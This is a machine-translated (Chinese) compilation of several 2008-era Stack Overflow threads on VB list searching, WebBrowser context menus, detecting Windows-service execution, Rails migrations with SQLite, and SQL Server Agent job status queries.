你想要[Find(Of T)](http://msdn.microsoft.com/en-us/library/x0b5b5bc.aspx)方法。您需要传入一个谓词（在这种情况下是一种委托）。如何构造该委托取决于您使用的 VB 版本。如果您使用的是 VB9，则可以使用 lambda 表达式。（请注意，如果您使用的是 VB9，您可能希望首先使用 LINQ 而不是 Find(Of T)。） lambda 表达式形式类似于：

```
list.Find(function(c) c.ID = 1) 
```

我不确定 VB8 是否像 C# 2 那样支持匿名方法。如果您需要从 VB8 调用它，我会看看我能想出什么。（我真的更像是一个 C# 人：）

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2008-10-14T06:32:22.013

通常你需要使用谓词：

```
list.Add(New Customer(1, "A"))
list.Add(New Customer(2, "B"))

Private Function HasID1(ByVal c As Customer) As Boolean
    Return (c.ID = 1)
End Function

Dim customerWithID1 As Customer = list.Find(AddressOf HasID1) 
```

或使用内联方法：

```
Dim customerWithID1 As Customer = list.Find(Function(p) p.ID = 1) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T09:46:48.813

您也可以重载 equals 方法，然后执行包含。像这样

```
Dim list as new list(Of Customer)

list.Add(New Customer(1,"A")

list.Add(New Customer(2,"B")

list.contains(new customer(1,"A")) 
```

equals 方法看起来像这样

```
public overrides function Equals(Obj as object) as Boolean
   return Me.Id.Equals(ctype(Obj,Customer).Id
end Function 
```

未经测试，但应该足够接近。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-10-14T06:17:46.457

如果您使用的是 .NET 3.5，则可以使用[LINQ to Objects](http://en.wikipedia.org/wiki/Language_Integrated_Query#LINQ_to_Objects)来完成：

*[如何：使用 LINQ 查询 ArrayList](http://msdn.microsoft.com/en-us/library/bb397937.aspx)*

如果没有，在 .NET 2.0 中您可以使用[`Find`list 的方法](http://msdn.microsoft.com/en-us/library/x0b5b5bc.aspx)。

这个想法是，如果您的对象的属性满足特定条件，您将需要提供一个返回 true 的方法。

# menu - 在 System.Windows.Forms.WebBrowser 控件中仅允许复制/粘贴上下文菜单

> ID：200162
> 
> 赞同：1
> 
> 时间：2008-10-14T06:18:21.243
> 
> 标签：menu, browser, contextmenu

WebBrowser 控件有一个名为“IsWebBrowserContextMenuEnabled”的属性，该属性禁用右键单击网页和查看上下文菜单的所有功能。这非常接近我想要的（我不希望任何人能够右键单击和打印、回击、点击属性、查看源代码等）。

唯一的问题是这也会禁用出现在 TextBoxes 中的上下文菜单，用于复制/粘贴等。

为了使这一点更清楚，这是我不想要的：
[![坏上下文](https://farm4.static.flickr.com/3047/2941073716_0c51ab4b3c_m.jpg)](http://www.flickr.com/photos/24262860@N00/2941073716/ "badcontext by andersonimes，在 Flickr 上")

这就是我想要的：
[![良好的背景](https://farm4.static.flickr.com/3024/2941073720_8aedaf9b06_o.png)](http://www.flickr.com/photos/24262860@N00/2941073720/ "安德森尼姆斯的goodcontext，在 Flickr 上")

我想禁用主上下文菜单，但允许出现在 TextBoxes 中的菜单。有人知道我会怎么做吗？WebBrowser.Document.ContextMenuShowing 事件看起来很有希望，但似乎无法正确识别用户右键单击的元素，无论是通过 HtmlElementEventArgs 参数的“FromElement”和“ToElement”属性，还是除了 HtmlDocument 之外的任何发送者元素。

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T06:46:28.537

您是否考虑过用 javascript 编写自己的上下文菜单？只需听用户右键单击正文，然后使用复制和粘贴命令显示您的菜单（提示：element.style.display = "block|none"）。要复制，请执行以下代码：

```
 CopiedTxt = document.selection.createRange();
   CopiedTxt.execCommand("Copy"); 
```

并粘贴：

```
 CopiedTxt = document.selection.createRange();
   CopiedTxt.execCommand("Paste"); 
```

来源：

[http://www.geekpedia.com/tutorial126_Clipboard-cut-copy-and-paste-with-JavaScript.html](http://www.geekpedia.com/tutorial126_Clipboard-cut-copy-and-paste-with-JavaScript.html)

注意：这仅适用于 IE（这对您的应用程序来说很好）。

我知道它无论如何都不是万无一失的，但是这里有一个代码示例可以帮助您入门：

```
<html>
    <head>
        <script type = "text/javascript">
            var lastForm = null;
            window.onload = function(){

                var menu = document.getElementById("ContextMenu");
                var cpy = document.getElementById("CopyBtn");
                var pst = document.getElementById("PasteBtn");

                document.body.onmouseup = function(){
                    if (event.button == 2)
                    {
                        menu.style.left = event.clientX + "px";
                        menu.style.top = event.clientY + "px";
                        menu.style.display = "block";

                        return true;
                    }

                    menu.style.display = "none";
                };

                cpy.onclick = function(){
                    copy = document.selection.createRange();
                    copy.execCommand("Copy");
                    return false;
                };

                pst.onclick = function(){
                    if (lastForm)
                    {
                        copy = lastForm.createTextRange();
                        copy.execCommand("Paste");
                    }
                    return false;
                };
            };
        </script>
    </head>

    <body oncontextmenu = "return false;">
        <div id = "ContextMenu" style = "display : none; background: #fff; border: 1px solid #aaa; position: absolute;
            width : 75px;">
            <a href = "#" id = "CopyBtn" style = "display: block; color : blue; text-decoration: none;">Copy</a>
            <a href = "#" id = "PasteBtn" style = "display: block; color : blue; text-decoration: none;">Paste</a>
        </div>
        sadgjghdskjghksghkds
        <input type = "text" onfocus = "lastForm = this;" />
    </body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-14T06:46:49.987

快速浏览一下[MSDN 文档](http://msdn.microsoft.com/en-us/library/system.windows.forms.webbrowser_events.aspx)表明，您的程序中不支持使用任何鼠标事件（单击、按钮向下/向上等）。恐怕它要么：要么禁用conetxt菜单，要么允许它们。

如果禁用它们，用户仍然可以使用键盘快捷键（Ctrl-C、Ctrl-V）复制和粘贴。也许这可以为您提供所需的功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-11-12T15:47:27.180

```
//Start:

function cutomizedcontextmenu(e)
{
    var target = window.event ? window.event.srcElement : e ? e.target : null;
    if( navigator.userAgent.toLowerCase().indexOf("msie") != -1 )
    {
        if (target.type != "text" && target.type != "textarea" && target.type != "password") 
        {
            alert(message);
            return false;
        }
    return true;
    }
    else if( navigator.product == "Gecko" )
    {
        alert(message);
        return false;
    }
} 

document.oncontextmenu = cutomizedcontextmenu;
//End: 
```

我希望这会帮助你安德森艾姆斯

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2008-12-15T20:23:08.673

我们最终使用了上述两种评论的组合。接近第二个，这就是我给他荣誉的原因。

有一种方法可以替换客户端 Web 代码以及通过 winforms 上的上下文菜单，这是我们采用的方法。我真的不想重写上下文菜单，但这似乎给了我们正确的控制组合。

# c# - 我是否作为服务运行

> ID：200163
> 
> 赞同：49
> 
> 时间：2008-10-14T06:19:09.637
> 
> 标签：c#, .net, windows-services

我目前正在为可以在控制台中运行的服务编写一些引导代码。它本质上归结为调用 OnStart() 方法，而不是使用 ServiceBase 来启动和停止服务（因为如果应用程序没有作为服务安装，它就不会运行应用程序，并使调试成为一场噩梦）。

现在我正在使用 Debugger.IsAttached 来确定是否应该使用 ServiceBase.Run 或 [service].OnStart，但我知道这不是最好的主意，因为有时最终用户希望在控制台中运行该服务（查看输出等实时）。

关于如何确定 Windows 服务控制器是否启动了“我”或用户是否在控制台中启动了“我”的任何想法？显然[Environment.IsUserInteractive](http://social.msdn.microsoft.com/Forums/en-US/csharpgeneral/thread/99c4594b-e6c9-424f-bfe1-c7261bba24d3/ "论坛主题")不是答案。我考虑过使用命令行参数，但这似乎很“脏”。

我总是可以看到有关 ServiceBase.Run 的 try-catch 语句，但这似乎很脏。编辑：尝试 catch 不起作用。

我有一个解决方案：把它放在这里给所有其他感兴趣的堆垛机：

```
 public void Run()
    {
        if (Debugger.IsAttached || Environment.GetCommandLineArgs().Contains<string>("-console"))
        {
            RunAllServices();
        }
        else
        {
            try
            {
                string temp = Console.Title;
                ServiceBase.Run((ServiceBase[])ComponentsToRun);
            }
            catch
            {
                RunAllServices();
            }
        }
    } // void Run

    private void RunAllServices()
    {
        foreach (ConsoleService component in ComponentsToRun)
        {
            component.Start();
        }
        WaitForCTRLC();
        foreach (ConsoleService component in ComponentsToRun)
        {
            component.Stop();
        }
    } 
```

编辑： StackOverflow 上还有一个问题，该人在 Environment.CurrentDirectory 为“C:\Windows\System32”时遇到问题，看起来这可能是答案。我今天会测试。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2010-07-02T10:48:25.347

另一种解决方法.. 所以可以作为 WinForm 或 Windows 服务运行

```
var backend = new Backend();

if (Environment.UserInteractive)
{
     backend.OnStart();
     Application.EnableVisualStyles();
     Application.SetCompatibleTextRenderingDefault(false);
     Application.Run(new Fronend(backend));
     backend.OnStop();
}
else
{
     var ServicesToRun = new ServiceBase[] {backend};
     ServiceBase.Run(ServicesToRun);
} 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2008-10-14T06:28:55.437

我通常将我的 Windows 服务标记为控制台应用程序，它采用“-console”的命令行参数来使用控制台运行，否则它作为服务运行。要进行调试，您只需将项目选项中的命令行参数设置为“-console”即可！

这使得调试变得简单易用，并且意味着应用程序默认作为服务运行，这正是您想要的。

* * *

## 回答 #3

> 赞同：16
> 
> 时间：2008-10-20T16:01:19.943

与 Ash 一样，我将所有实际处理代码编写在单独的类库程序集中，然后由 Windows 服务可执行文件以及控制台应用程序引用。

但是，有时了解类库是在服务可执行文件还是控制台应用程序的上下文中运行很有用。我这样做的方式是反映托管应用程序的基类。（对不起VB，但我想以下内容可以很容易地被c#化）：

```
Public Class ExecutionContext
    ''' <summary>
    ''' Gets a value indicating whether the application is a windows service.
    ''' </summary>
    ''' <value>
    ''' <c>true</c> if this instance is service; otherwise, <c>false</c>.
    ''' </value>
    Public Shared ReadOnly Property IsService() As Boolean
        Get
            ' Determining whether or not the host application is a service is
            ' an expensive operation (it uses reflection), so we cache the
            ' result of the first call to this method so that we don't have to
            ' recalculate it every call.

            ' If we have not already determined whether or not the application
            ' is running as a service...
            If IsNothing(_isService) Then

                ' Get details of the host assembly.
                Dim entryAssembly As Reflection.Assembly = Reflection.Assembly.GetEntryAssembly

                ' Get the method that was called to enter the host assembly.
                Dim entryPoint As System.Reflection.MethodInfo = entryAssembly.EntryPoint

                ' If the base type of the host assembly inherits from the
                ' "ServiceBase" class, it must be a windows service. We store
                ' the result ready for the next caller of this method.
                _isService = (entryPoint.ReflectedType.BaseType.FullName = "System.ServiceProcess.ServiceBase")

            End If

            ' Return the cached result.
            Return CBool(_isService)
        End Get
    End Property

    Private Shared _isService As Nullable(Of Boolean) = Nothing
#End Region
End Class 
```

* * *

## 回答 #4

> 赞同：15
> 
> 时间：2008-10-16T10:47:17.283

什么对我有用：

*   执行实际服务工作的类在单独的线程中运行。
*   该线程从 OnStart() 方法内启动，并从 OnStop() 停止。
*   服务模式和控制台模式之间的决定取决于`Environment.UserInteractive`

示例代码：

```
class MyService : ServiceBase
{
    private static void Main()
    {
        if (Environment.UserInteractive)
        {
            startWorkerThread();
            Console.WriteLine ("======  Press ENTER to stop threads  ======");
            Console.ReadLine();
            stopWorkerThread() ;
            Console.WriteLine ("======  Press ENTER to quit  ======");
            Console.ReadLine();
        }
        else
        {
            Run (this) ;
        }
    }

    protected override void OnStart(string[] args)
    {
        startWorkerThread();
    }

    protected override void OnStop()
    {
        stopWorkerThread() ;
    }
} 
```

* * *

## 回答 #5

> 赞同：10
> 
> 时间：2008-10-14T06:34:44.580

乔纳森，不完全是您问题的答案，但我刚刚完成了一个 Windows 服务的编写，并且还注意到调试和测试的困难。

通过简单地在单独的类库程序集中编写所有实际处理代码来解决它，然后由 Windows 服务可执行文件以及控制台应用程序和测试工具引用。

除了基本的计时器逻辑之外，所有更复杂的处理都发生在通用程序集中，并且可以非常容易地按需测试/运行。

* * *

## 回答 #6

> 赞同：10
> 
> 时间：2010-01-21T17:44:12.377

我已修改 ProjectInstaller 以附加命令行参数参数 /service，当它作为服务安装时：

```
static class Program
{
    static void Main(string[] args)
    {
        if (Array.Exists(args, delegate(string arg) { return arg == "/install"; }))
        {
            System.Configuration.Install.TransactedInstaller ti = null;
            ti = new System.Configuration.Install.TransactedInstaller();
            ti.Installers.Add(new ProjectInstaller());
            ti.Context = new System.Configuration.Install.InstallContext("", null);
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            ti.Context.Parameters["assemblypath"] = path;
            ti.Install(new System.Collections.Hashtable());
            return;
        }

        if (Array.Exists(args, delegate(string arg) { return arg == "/uninstall"; }))
        {
            System.Configuration.Install.TransactedInstaller ti = null;
            ti = new System.Configuration.Install.TransactedInstaller();
            ti.Installers.Add(new ProjectInstaller());
            ti.Context = new System.Configuration.Install.InstallContext("", null);
            string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
            ti.Context.Parameters["assemblypath"] = path;
            ti.Uninstall(null);
            return;
        }

        if (Array.Exists(args, delegate(string arg) { return arg == "/service"; }))
        {
            ServiceBase[] ServicesToRun;

            ServicesToRun = new ServiceBase[] { new MyService() };
            ServiceBase.Run(ServicesToRun);
        }
        else
        {
            Console.ReadKey();
        }
    }
} 
```

然后修改 ProjectInstaller.cs 以覆盖 OnBeforeInstall() 和 OnBeforeUninstall()

```
[RunInstaller(true)]
public partial class ProjectInstaller : Installer
{
    public ProjectInstaller()
    {
        InitializeComponent();
    }

    protected virtual string AppendPathParameter(string path, string parameter)
    {
        if (path.Length > 0 && path[0] != '"')
        {
            path = "\"" + path + "\"";
        }
        path += " " + parameter;
        return path;
    }

    protected override void OnBeforeInstall(System.Collections.IDictionary savedState)
    {
        Context.Parameters["assemblypath"] = AppendPathParameter(Context.Parameters["assemblypath"], "/service");
        base.OnBeforeInstall(savedState);
    }

    protected override void OnBeforeUninstall(System.Collections.IDictionary savedState)
    {
        Context.Parameters["assemblypath"] = AppendPathParameter(Context.Parameters["assemblypath"], "/service");
        base.OnBeforeUninstall(savedState);
    }
} 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2012-04-04T02:45:03.583

这个线程真的很旧，但我想我会把我的解决方案扔在那里。很简单，为了处理这种情况，我构建了一个用于控制台和 Windows 服务案例的“服务工具”。如上，大部分逻辑都包含在一个单独的库中，但这更多是为了测试和“可链接性”。

随附的代码绝不代表解决此问题的“最佳”方法，只是我自己的方法。在这里，服务工具在“控制台模式”下由控制台应用程序调用，当它作为服务运行时由同一应用程序的“启动服务”逻辑调用。通过这样做，您现在可以调用

`ServiceHost.Instance.RunningAsAService`（布尔）

从代码中的任何位置检查应用程序是作为服务运行还是仅作为控制台运行。

这是代码：

```
public class ServiceHost
{
    private static Logger log = LogManager.GetLogger(typeof(ServiceHost).Name);

    private static ServiceHost mInstance = null;
    private static object mSyncRoot = new object();

    #region Singleton and Static Properties

    public static ServiceHost Instance
    {
        get
        {
            if (mInstance == null)
            {
                lock (mSyncRoot)
                {
                    if (mInstance == null)
                    {
                        mInstance = new ServiceHost();
                    }
                }
            }

            return (mInstance);
        }
    }

    public static Logger Log
    {
        get { return log; }
    }

    public static void Close()
    {
        lock (mSyncRoot)
        {
            if (mInstance.mEngine != null)
                mInstance.mEngine.Dispose();
        }
    }

    #endregion

    private ReconciliationEngine mEngine;
    private ServiceBase windowsServiceHost;
    private UnhandledExceptionEventHandler threadExceptionHanlder = new UnhandledExceptionEventHandler(ThreadExceptionHandler);

    public bool HostHealthy { get; private set; }
    public bool RunningAsService {get; private set;}

    private ServiceHost()
    {
        HostHealthy = false;
        RunningAsService = false;
        AppDomain.CurrentDomain.UnhandledException += threadExceptionHandler;

        try
        {
            mEngine = new ReconciliationEngine();
            HostHealthy = true;
        }
        catch (Exception ex)
        {
            log.FatalException("Could not initialize components.", ex);
        }
    }

    public void StartService()
    {
        if (!HostHealthy)
            throw new ApplicationException("Did not initialize components.");

        try
        {
            mEngine.Start();
        }
        catch (Exception ex)
        {
            log.FatalException("Could not start service components.", ex);
            HostHealthy = false;
        }
    }

    public void StartService(ServiceBase serviceHost)
    {
        if (!HostHealthy)
            throw new ApplicationException("Did not initialize components.");

        if (serviceHost == null)
            throw new ArgumentNullException("serviceHost");

        windowsServiceHost = serviceHost;
        RunningAsService = true;

        try
        {
            mEngine.Start();
        }
        catch (Exception ex)
        {
            log.FatalException("Could not start service components.", ex);
            HostHealthy = false;
        }
    }

    public void RestartService()
    {
        if (!HostHealthy)
            throw new ApplicationException("Did not initialize components.");         

        try
        {
            log.Info("Stopping service components...");
            mEngine.Stop();
            mEngine.Dispose();

            log.Info("Starting service components...");
            mEngine = new ReconciliationEngine();
            mEngine.Start();
        }
        catch (Exception ex)
        {
            log.FatalException("Could not restart components.", ex);
            HostHealthy = false;
        }
    }

    public void StopService()
    {
        try
        {
            if (mEngine != null)
                mEngine.Stop();
        }
        catch (Exception ex)
        {
            log.FatalException("Error stopping components.", ex);
            HostHealthy = false;
        }
        finally
        {
            if (windowsServiceHost != null)
                windowsServiceHost.Stop();

            if (RunningAsService)
            {
                AppDomain.CurrentDomain.UnhandledException -= threadExceptionHanlder;
            }
        }
    }

    private void HandleExceptionBasedOnExecution(object ex)
    {
        if (RunningAsService)
        {
            windowsServiceHost.Stop();
        }
        else
        {
            throw (Exception)ex;
        }
    }

    protected static void ThreadExceptionHandler(object sender, UnhandledExceptionEventArgs e)
    {
        log.FatalException("Unexpected error occurred. System is shutting down.", (Exception)e.ExceptionObject);
        ServiceHost.Instance.HandleExceptionBasedOnExecution((Exception)e.ExceptionObject);
    }
} 
```

您在这里需要做的就是`ReconcilationEngine`用任何可以增强您的逻辑的方法替换那个看起来不祥的参考。然后在您的应用程序中，无论您是在控制台模式下运行还是作为服务运行，都使用`ServiceHost.Instance.Start()`and方法。`ServiceHost.Instance.Stop()`

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-11-04T07:31:17.520

也许检查进程父进程是否是 C:\Windows\system32\services.exe。

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2008-10-14T06:37:58.850

我发现实现这一点的唯一方法是首先检查控制台是否附加到进程，方法是访问 try/catch 块内的任何控制台对象属性（例如标题）。

如果服务是单片机启动的，没有控制台，访问属性会抛出System.IO.IOError。

但是，由于这感觉有点像依赖特定于实现的细节（如果某些平台上的 SCM 或某天决定为其启动的进程提供控制台怎么办？），我总是使用命令行开关（-console ) 在生产应用程序中...

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2015-01-14T02:54:50.163

这是 chksr 对 .NET 的回答的翻译，并避免了无法识别交互式服务的错误：

```
using System.Security.Principal;

var wi = WindowsIdentity.GetCurrent();
var wp = new WindowsPrincipal(wi);
var serviceSid = new SecurityIdentifier(WellKnownSidType.ServiceSid, null);
var localSystemSid = new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null);
var interactiveSid = new SecurityIdentifier(WellKnownSidType.InteractiveSid, null);
// maybe check LocalServiceSid, and NetworkServiceSid also

bool isServiceRunningAsUser = wp.IsInRole(serviceSid);
bool isSystem = wp.IsInRole(localSystemSid);
bool isInteractive = wp.IsInRole(interactiveSid);

bool isAnyService = isServiceRunningAsUser || isSystem || !isInteractive; 
```

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2008-10-14T06:39:11.017

这有点像自插式，但我有一个小应用程序，它可以通过反射在你的应用程序中加载你的服务类型并以这种方式执行它们。我包含了源代码，因此您可以稍微更改它以显示标准输出。

使用此解决方案无需更改代码。我也有一个 Debugger.IsAttached 类型的解决方案，它足够通用，可以与任何服务一起使用。链接在这篇文章中： [.NET Windows Service Runner](http://theimes.com/archive/2007/08/22/net-windows-service-runner.aspx)

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2014-09-12T11:43:37.000

好吧，有一些非常古老的代码（大约 20 年左右，不是来自我，而是在狂野、狂野的网络中发现的，并且在 C 而不是 C# 中）应该让您了解如何完成这项工作：

```
enum enEnvironmentType
    {
    ENVTYPE_UNKNOWN,
    ENVTYPE_STANDARD,
    ENVTYPE_SERVICE_WITH_INTERACTION,
    ENVTYPE_SERVICE_WITHOUT_INTERACTION,
    ENVTYPE_IIS_ASP,
    };

enEnvironmentType GetEnvironmentType(void)
{
    HANDLE  hProcessToken   = NULL;
    DWORD   groupLength     = 300;
    PTOKEN_GROUPS groupInfo = NULL;

    SID_IDENTIFIER_AUTHORITY siaNt = SECURITY_NT_AUTHORITY;
    PSID    pInteractiveSid = NULL;
    PSID    pServiceSid = NULL;

    DWORD   dwRet = NO_ERROR;
    DWORD   ndx;

    BOOL    m_isInteractive = FALSE;
    BOOL    m_isService = FALSE;

    // open the token
    if (!::OpenProcessToken(::GetCurrentProcess(),TOKEN_QUERY,&hProcessToken))
        {
        dwRet = ::GetLastError();
        goto closedown;
        }

    // allocate a buffer of default size
    groupInfo = (PTOKEN_GROUPS)::LocalAlloc(0, groupLength);
    if (groupInfo == NULL)
        {
        dwRet = ::GetLastError();
        goto closedown;
        }

    // try to get the info
    if (!::GetTokenInformation(hProcessToken, TokenGroups,
        groupInfo, groupLength, &groupLength))
        {
        // if buffer was too small, allocate to proper size, otherwise error
        if (::GetLastError() != ERROR_INSUFFICIENT_BUFFER)
            {
            dwRet = ::GetLastError();
            goto closedown;
            }

        ::LocalFree(groupInfo);

        groupInfo = (PTOKEN_GROUPS)::LocalAlloc(0, groupLength);
        if (groupInfo == NULL)
            {
            dwRet = ::GetLastError();
            goto closedown;
            }

        if (!GetTokenInformation(hProcessToken, TokenGroups,
            groupInfo, groupLength, &groupLength))
            {
            dwRet = ::GetLastError();
            goto closedown;
            }
        }

    //
    //  We now know the groups associated with this token.  We want
    //  to look to see if the interactive group is active in the
    //  token, and if so, we know that this is an interactive process.
    //
    //  We also look for the "service" SID, and if it's present,
    //  we know we're a service.
    //
    //  The service SID will be present iff the service is running in a
    //  user account (and was invoked by the service controller).
    //

    // create comparison sids
    if (!AllocateAndInitializeSid(&siaNt,
        1,
        SECURITY_INTERACTIVE_RID,
        0, 0, 0, 0, 0, 0, 0,
        &pInteractiveSid))
        {
        dwRet = ::GetLastError();
        goto closedown;
        }

    if (!AllocateAndInitializeSid(&siaNt,
        1,
        SECURITY_SERVICE_RID,
        0, 0, 0, 0, 0, 0, 0,
        &pServiceSid))
        {
        dwRet = ::GetLastError();
        goto closedown;
        }

    // try to match sids
    for (ndx = 0; ndx < groupInfo->GroupCount ; ndx += 1)
        {
        SID_AND_ATTRIBUTES  sanda = groupInfo->Groups[ndx];
        PSID                pSid = sanda.Sid;

        //
        //    Check to see if the group we're looking at is one of
        //    the two groups we're interested in.
        //

        if (::EqualSid(pSid, pInteractiveSid))
            {
            //
            //  This process has the Interactive SID in its
            //  token.  This means that the process is running as
            //  a console process
            //
            m_isInteractive = TRUE;
            m_isService = FALSE;
            break;
            }
        else if (::EqualSid(pSid, pServiceSid))
            {
            //
            //  This process has the Service SID in its
            //  token.  This means that the process is running as
            //  a service running in a user account ( not local system ).
            //
            m_isService = TRUE;
            m_isInteractive = FALSE;
            break;
            }
        }

    if ( !( m_isService || m_isInteractive ) )
        {
        //
        //  Neither Interactive or Service was present in the current
        //  users token, This implies that the process is running as
        //  a service, most likely running as LocalSystem.
        //
        m_isService = TRUE;
        }

closedown:
    if ( pServiceSid )
        ::FreeSid( pServiceSid );

    if ( pInteractiveSid )
        ::FreeSid( pInteractiveSid );

    if ( groupInfo )
        ::LocalFree( groupInfo );

    if ( hProcessToken )
        ::CloseHandle( hProcessToken );

    if (dwRet == NO_ERROR)
        {
        if (m_isService)
            return(m_isInteractive ? ENVTYPE_SERVICE_WITH_INTERACTION : ENVTYPE_SERVICE_WITHOUT_INTERACTION);
        return(ENVTYPE_STANDARD);
        }
      else
        return(ENVTYPE_UNKNOWN);
} 
```

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2020-02-11T18:03:39.657

似乎我参加聚会有点晚了，但是作为服务运行时有趣的区别是，在启动时，当前文件夹指向系统目录（`C:\windows\system32`默认情况下）。在任何现实生活中，用户应用程序几乎不可能从系统文件夹开始。

所以，我使用以下技巧（c#）：

```
protected static bool IsRunAsService()
{
    string CurDir = Directory.GetCurrentDirectory();
    if (CurDir.Equals(Environment.SystemDirectory, StringComparison.CurrentCultureIgnoreCase))
    { 
         return true; 
    }

    return (false);
} 
```

对于未来的扩展，需要进行额外的检查`System.Environment.UserInteractive == false`（但我不知道它与“允许服务与桌面交互”服务设置有何关联）。

您还可以通过`System.Diagnostics.Process.GetCurrentProcess().SessionId == 0`（我不知道它与“允许服务与桌面交互”服务设置之间的关系如何）来检查窗口会话。

如果您编写可移植代码（例如，使用 .NetCore），您还可以检查`Environment.OSVersion.Platform`以确保您首先在 Windows 上。

# ruby-on-rails - 使用 Ruby on Rails 2 在 Sqlite 中创建新表的最佳方法

> ID：200178
> 
> 赞同：1
> 
> 时间：2008-10-14T06:29:13.720
> 
> 标签：ruby-on-rails, sqlite, rake

那么在 Rails 2 的 Sqlite 数据库中创建新表的最佳方法是什么。我使用 rake db:migrate 命令创建了数据库。所以我应该编写单独的 sql 脚本来创建数据库还是以某种方式使用 rake。我不需要脚手架。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-10-14T09:03:13.020

尽量避免编写 CREATE/ALTER 表脚本并改用 ActiveRecord 迁移。有几个原因浮现在脑海：

*   可移植性：让 AR 处理跨平台的风味差异要容易得多
*   更改控制：您的迁移可以使用 VERSION= 选项管理双向更改，这在 SQL 中并不容易做到
*   这是 Rails 的方式：遵循 Rails 约定，除非你有令人信服的理由不这样做
*   简单性：使用迁移时不必担心 id 和 timestamp 列，如果您使用 SQL 工作，则无需记住它们

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-10-14T10:01:59.670

基本上使用迁移。

[http://wiki.rubyonrails.org/rails/pages/understandingmigrations](http://wiki.rubyonrails.org/rails/pages/understandingmigrations)和[http://wiki.rubyonrails.org/rails/pages/UsingMigrations](http://wiki.rubyonrails.org/rails/pages/UsingMigrations)提供了有关如何使用迁移的一些有用帮助。我使用的一个很好的备忘单也可以在[http://dizzy.co.uk/ruby_on_rails/cheatsheets/rails-migrations](http://dizzy.co.uk/ruby_on_rails/cheatsheets/rails-migrations)上找到。

基本上，迁移使用 ruby​​ 代码为您创建数据库表。使用漂亮的 ruby​​ 代码而不是 SQL DDL 来做这件事要容易得多（至少在我看来）——它还自动为你做各种事情（比如`id`根据 rails 的需要向所有表中添加字段）。然后，您可以使用 rake 任务将迁移实际应用到您的数据库。迁移给您的另一个主要优势是它们是可逆的——因此您的数据库是版本化的，您可以轻松地从一个版本跳转到另一个版本。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T07:01:58.647

如果您不使用脚手架，那么您应该使用`script/generate migration`为每个表创建一个迁移文件。无需使用 sql 脚本。创建一些迁移后，您可以使用 rake db:migrate 将它们应用到您的数据库中。

# sql - 如何确定工作的状态？

> ID：200195
> 
> 赞同：52
> 
> 时间：2008-10-14T06:46:47.270
> 
> 标签：sql, sql-server-2005, tsql, stored-procedures

我有一个安排工作的存储过程。这项工作需要很长时间才能完成（大约 30 到 40 分钟）。我需要了解这个 Job 的状态。以下详细信息将对我有所帮助

1) 如何查看已安排在未来某个时间但尚未开始的所有作业的列表

2) 如何查看正在运行的作业列表以及它们运行的​​时间跨度

3) 如何查看作业是否已成功完成或因任何错误而在其间停止。

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2013-08-05T15:43:15.343

我想指出，此页面上的任何 T-SQL 都不会准确工作，因为它们都不会加入**syssessions**表以仅获取当前会话，因此可能包含误报。

请参阅此内容以供参考：[拥有空停止日期的工作意味着什么？](https://stackoverflow.com/questions/13037668/what-does-it-mean-to-have-jobs-with-a-null-stop-date/13038752#13038752)

您还可以通过分析**msdb中的****sp_help_jobactivity**过程来验证这一点。

 **我意识到这是关于 SO 的旧消息，但由于问题，我发现此消息仅部分有用。

```
SELECT
    job.name, 
    job.job_id, 
    job.originating_server, 
    activity.run_requested_date, 
    DATEDIFF( SECOND, activity.run_requested_date, GETDATE() ) as Elapsed
FROM 
    msdb.dbo.sysjobs_view job
JOIN
    msdb.dbo.sysjobactivity activity
ON 
    job.job_id = activity.job_id
JOIN
    msdb.dbo.syssessions sess
ON
    sess.session_id = activity.session_id
JOIN
(
    SELECT
        MAX( agent_start_date ) AS max_agent_start_date
    FROM
        msdb.dbo.syssessions
) sess_max
ON
    sess.agent_start_date = sess_max.max_agent_start_date
WHERE 
    run_requested_date IS NOT NULL AND stop_execution_date IS NULL 
```

* * *

## 回答 #2

> 赞同：48
> 
> 时间：2008-10-14T07:41:05.680

您可以尝试使用系统存储过程 sp_help_job。这将返回有关作业、其步骤、时间表和服务器的信息。例如

```
EXEC msdb.dbo.sp_help_job @Job_name = 'Your Job Name' 
```

[SQL 联机丛书](http://msdn.microsoft.com/en-us/library/ms186722(SQL.90).aspx)应包含有关它返回的记录的大量信息。

要返回有关多个作业的信息，您可以尝试查询以下系统表，其中包含有关作业的各种信息

*   msdb.dbo.SysJobs
*   msdb.dbo.SysJobSteps
*   msdb.dbo.SysJobSchedules
*   msdb.dbo.SysJobServers
*   msdb.dbo.SysJobHistory

它们的名称是不言自明的（除了 SysJobServers，它保存有关作业上次运行时间和结果的信息）。

同样，可以在 MSDN 上找到有关字段的信息。例如，查看[SysJobs页面](http://msdn.microsoft.com/en-us/library/ms189817.aspx)

* * *

## 回答 #3

> 赞同：27
> 
> 时间：2008-10-26T13:18:54.627

这就是我用来获取正在运行的作业的内容（主要是为了让我可以杀死那些可能已经挂起的作业）：

```
SELECT
    job.Name, job.job_ID
    ,job.Originating_Server
    ,activity.run_requested_Date
    ,datediff(minute, activity.run_requested_Date, getdate()) AS Elapsed
FROM
    msdb.dbo.sysjobs_view job 
        INNER JOIN msdb.dbo.sysjobactivity activity
        ON (job.job_id = activity.job_id)
WHERE
    run_Requested_date is not null 
    AND stop_execution_date is null
    AND job.name like 'Your Job Prefix%' 
```

正如 Tim 所说，MSDN / BOL 文档在 sysjobsX 表的内容上相当不错。请记住它们是 MSDB 中的表。

